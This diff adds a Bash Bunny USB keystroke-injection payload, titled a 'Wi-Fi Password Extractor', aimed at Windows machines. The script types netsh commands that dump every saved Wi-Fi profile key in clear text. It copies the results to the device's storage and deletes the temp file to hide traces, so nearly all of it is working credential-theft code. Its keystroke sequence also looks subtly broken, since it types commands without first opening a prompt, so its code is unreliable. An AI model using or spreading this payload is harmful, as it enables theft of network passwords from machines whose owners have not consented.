@@ -1,0 +1,33 @@
+#!/bin/bash
+# Title: Wi-Fi Password Extractor
+# Author: Austin Spraggins
+# Description: Extracts saved Wi-Fi passwords from a Windows machine.
+
+LED SETUP
+
+# Switch to attack mode
+ATTACKMODE HID STORAGE
+
+# Wait for the system to recognize the storage device
+LED STAGE1
+sleep 5
+
+# Open a command prompt and run the commands to extract Wi-Fi passwords
+Q STRING "cmd.exe /C netsh wlan show profiles"
+Q ENTER
+sleep 1
+Q STRING "for /F \"tokens=1,2 delims=:\" %G in ('netsh wlan show profiles') do @for /F \"tokens=2 delims=:\" %F in ('netsh wlan show profiles name=\"%G\" key=clear') do @echo SSID:%G Key=%F >> %TEMP%\\wifi-passwords.txt"
+Q ENTER
+sleep 5
+
+# Copy the results to the Bash Bunny storage
+Q STRING "copy %TEMP%\\wifi-passwords.txt E:\\wifi-passwords.txt"
+Q ENTER
+sleep 2
+
+# Cleanup
+Q STRING "del %TEMP%\\wifi-passwords.txt"
+Q ENTER
+sleep 1
+
+LED FINISH
